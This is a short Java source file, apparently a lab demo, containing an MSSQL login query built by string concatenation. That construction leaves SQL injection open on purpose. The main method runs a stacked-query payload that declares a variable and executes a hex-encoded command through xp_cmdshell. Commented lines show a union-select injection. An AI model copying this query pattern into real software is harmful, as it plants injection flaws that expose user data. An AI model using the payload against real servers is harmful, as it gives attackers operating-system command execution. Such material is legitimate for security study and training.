package com.ppp;

import java.sql.Connection;
import java.sql.DriverManager;
import java.sql.ResultSet;
import java.sql.Statement;
import java.util.ArrayList;
import java.util.List;

/**
 * @author Whoopsunix
 */
public class Mssql {
    public static void main(String[] args) throws Exception {
//        System.out.println(select(null, "admin", "123456"));
//        System.out.println(select(null, "1' union select * from users--", "123456"));
        System.out.println(select(null, "';DECLARE @bjxl VARCHAR(8000);SET @bjxl=0x6970636f6e666967;EXEC master..xp_cmdshell @bjxl--", "123456"));
    }

    public static List<Object> select(Integer id, String username, String password) throws Exception {
        Connection connection = DriverManager.getConnection(SQLInfo.MSSQLDBURL, SQLInfo.MSSQLUSER, SQLInfo.MSSQLPASSWORD);
        Statement statement = connection.createStatement();

        String sql = "SELECT * FROM users where username = '" + username + "' and password = '" + password + "';";
        ResultSet resultSet = statement.executeQuery(sql);

        List<Object> result = new ArrayList<>();
        while (resultSet.next()) {
            result.add(new Users(resultSet.getInt("id"), resultSet.getString("username"), resultSet.getString("password")));
        }

        if (resultSet != null) resultSet.close();
        if (statement != null) statement.close();
        if (connection != null) connection.close();
        return result;
    }
}
